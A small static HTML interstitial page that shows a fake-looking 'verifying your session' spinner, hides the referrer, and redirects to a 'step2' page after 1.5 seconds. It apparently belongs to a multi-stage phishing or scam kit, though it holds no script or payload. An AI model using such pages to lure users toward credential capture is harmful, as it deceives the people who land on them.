<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verifying your session...</title>
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="refresh" content="1.5; url=step2/index.html">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      background: linear-gradient(to right, #eef2f3, #f9fbfc);
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #333;
    }

    .card {
      background: #fff;
      padding: 40px;
      border-radius: 14px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
      text-align: center;
      width: 100%;
      max-width: 400px;
    }

    .card h1 {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 12px;
    }

    .card p {
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
    }

    .loader {
      width: 36px;
      height: 36px;
      border: 4px solid #ccc;
      border-top: 4px solid #007aff;
      border-radius: 50%;
      animation: spin 0.6s linear infinite;
      margin: 0 auto 16px auto;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .note {
      font-size: 12px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Please hold on...</h1>
    <p>We're verifying your session to ensure a secure connection.<br>This wonâ€™t take long.</p>
    <div class="loader"></div>
    <p class="note">Automatic redirect will happen in a moment.</p>
  </div>
</body>
</html>
